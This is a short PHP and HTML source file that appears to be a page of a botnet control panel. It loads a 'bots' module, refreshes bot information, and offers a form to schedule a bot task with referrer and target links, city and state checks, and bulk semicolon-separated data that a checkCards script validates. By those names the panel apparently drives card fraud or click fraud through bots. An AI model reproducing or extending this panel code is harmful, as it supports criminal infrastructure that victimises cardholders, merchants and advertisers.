<?php

require_once 'mod_dbase.php';
require_once 'mod_bots.php';

$dbase = db_open();
if (!$dbase) exit;

refresh_bot_info($dbase);

?>

<script type="text/javascript" charset="ISO-8859-1" src="js/check_cards.js" defer></script>
<script type="text/javascript" defer>
function createTask(PARSGT_, ULGT_) {
	if (checkCards(PARSGT_, ULGT_)) {
		var pdata = ajax_getInputs('frm_createTask');
		ajax_pload("mod_gtask.php", pdata, 'div_ajax');
	}
}
</script>

<form id='frm_createTask' onsubmit='createTask(this.PARSGT_, this.ULGT_.value); return false;'>

<table>
<tr align='left'>
	<td><label>DATE/TIME START:</label></td>
	<td><input name='SDGT_' value='<?php echo gmdate('Y.m.d H:i:s') ?>' size='22' maxlenght='20'></td>
</tr>
<tr align='left'>
	<td><label>DATE/TIME FINISH:</label></td>
	<td><input name='FDGT_' value='<?php echo gmdate('Y.m.d H:i:s', time() + (10 * 60 * 60)); ?>' size='22' maxlenght='20'></td>
</tr>
<tr align='left'>
	<td><label>REF LINK:</label></td>
	<td><input size='80' name='REFULGT_' value='' maxlenght=1000></td>
</tr>
<tr align='left'>
	<td><label>USED LINK:</label></td>
	<td><input size='80' name='ULGT_' value='' maxlenght=1000></td>
</tr>
<tr align='left'>
	<td><label>Check cities:</label></td>
	<td><input type=checkbox name='ChkCt'></td><td>
</tr>
<tr align='left'>
	<td><label>Check states:</label></td>
	<td><input type=checkbox name='ChkSt' checked></td>
</tr>

<tr align='left'>
	<td colspan='2'><label>ALL DATA OF CREATED TASK: (DIV - ";")</label><br><textarea name='PARSGT_' cols='100' rows='11' wrap='off'></textarea></td>
</tr>
<tr align='left'>
	<td colspan='2'><label>NOTE:</label><br><textarea name='NOTE' cols='100' rows='3' wrap='off'></textarea></td>
</tr>
</table>

<br><br><input type='submit' value='SAVE'>

</form>

<?php
	 
db_close($dbase);

?>